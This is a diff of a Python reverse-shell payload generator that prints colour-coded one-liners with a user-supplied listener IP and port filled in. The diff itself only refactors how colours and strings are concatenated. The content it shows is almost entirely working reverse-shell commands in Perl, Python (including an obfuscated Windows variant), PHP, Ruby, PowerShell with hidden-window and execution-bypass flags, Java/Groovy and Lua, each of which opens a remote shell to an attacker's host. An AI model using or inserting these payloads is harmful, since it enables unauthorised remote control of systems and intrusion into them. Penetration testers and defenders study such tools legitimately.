@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 import argparse, sys, os, re, socket, subprocess
 from urllib import request
-from random import choice, choices
+from random import choice, sample
 import signal
 import ipaddress
 
@@ -64,7 +64,7 @@ def shell():
     ipp, port = ask_listener()
 
     # Keeping with the random colors, but adding color coding for different OS
-    os_colors = choices(color, k=3)
+    os_colors = sample(color, 3)
     windows_color = os_colors[0]
     linux_color = os_colors[1]
     both_color = os_colors[2]
@@ -116,37 +116,27 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
 ╚═══════════════════════════════════════════════════
 
 ╔PERL═══════════════════════════════════════════════
-║ perl -e 'use Socket;$i="xxx";$p=yyy;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""".replace("xxx", ipp).replace("yyy", port), end='')
-    print(both_color, end='')
-    print(r"""
+║ perl -e 'use Socket;$i="xxx";$p=yyy;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" + both_color + r"""
 ╠═══════════════════════════════════════════════════
-║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""".replace("xxx", ipp).replace("yyy", port), end='')
-    print(windows_color, end='')
-    print(r"""
+║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""" + windows_color + r"""
 ╠══════════════╦════════════════════════════════════
 ║ Windows only ║ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-╚══════════════╩════════════════════════════════════""".replace("xxx", ipp).replace("yyy", port))
-    print(linux_color, end='')
-    print(r"""
+╚══════════════╩════════════════════════════════════""" + linux_color + r"""
+
 ╔PYTHON═════════════════════════════════════════════
 ║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ╠═══════════════════════════════════════════════════
-║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".replace("xxx", ipp).replace("yyy", port), end='')
-    print(windows_color, end='')
-    print(r"""
+║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" + windows_color + r"""
 ╠══════════════╦════════════════════════════════════
 ║ Windows only ║ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('xxx', yyy)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
-╚══════════════╩════════════════════════════════════""".replace("xxx", ipp).replace("yyy", port))
-    print(linux_color, end='')
-    print(r"""
+╚══════════════╩════════════════════════════════════""" + linux_color + r"""
+
 ╔PHP════════════════════════════════════════════════
 ║ php -r '$sock=fsockopen("xxx",yyy);exec("/bin/sh -i <&3 >&3 2>&3");'
 ╚═══════════════════════════════════════════════════
 
 ╔RUBY═══════════════════════════════════════════════
-║ ruby -rsocket -e'f=TCPSocket.open("xxx",yyy).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""".replace("xxx", ipp).replace("yyy", port), end='')
-    print(windows_color, end='')
-    print(r"""
+║ ruby -rsocket -e'f=TCPSocket.open("xxx",yyy).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""" + windows_color + r"""
 ╠══════════════╦════════════════════════════════════
 ║ Windows only ║ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ╠══════════════╬════════════════════════════════════
@@ -157,28 +147,22 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
 ║ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("xxx",yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ╠═══════════════════════════════════════════════════
 ║ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('xxx',yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-╚═══════════════════════════════════════════════════""".replace("xxx", ipp).replace("yyy", port))
-    print(linux_color, end='')
-    print(r"""
+╚═══════════════════════════════════════════════════""" + linux_color + r"""
+
 ╔JAVA═══════════════════════════════════════════════
 ║ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/xxx/yyy;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
-╚═══════════════════════════════════════════════════""".replace("xxx", ipp).replace("yyy", port), end='')
-    print(windows_color, end='')
-    print(r"""
+╚═══════════════════════════════════════════════════""" + windows_color + r"""
 ╔JAVA for GROOVY════════════════════════════════════
 ║ String host="xxx";
 int port=yyy;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-╚═══════════════════════════════════════════════════""".replace("xxx", ipp).replace("yyy", port))
-    print(linux_color, end='')
-    print(r"""
+╚═══════════════════════════════════════════════════""" + linux_color + r"""
+
 ╔LUA═════════╦══════════════════════════════════════
-║ Linux only ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');" """.replace("xxx", ipp).replace("yyy", port), end='')
-    print(both_color, end='')
-    print(r"""
+║ Linux only ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');" """ + both_color + r"""
 ╠════════════╩══════╦═══════════════════════════════
 ║ Windows and Linux ║ lua5.1 -e 'local host, port = "xxx", yyy local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ╚═══════════════════╩═══════════════════════════════""".replace("xxx", ipp).replace("yyy", port))
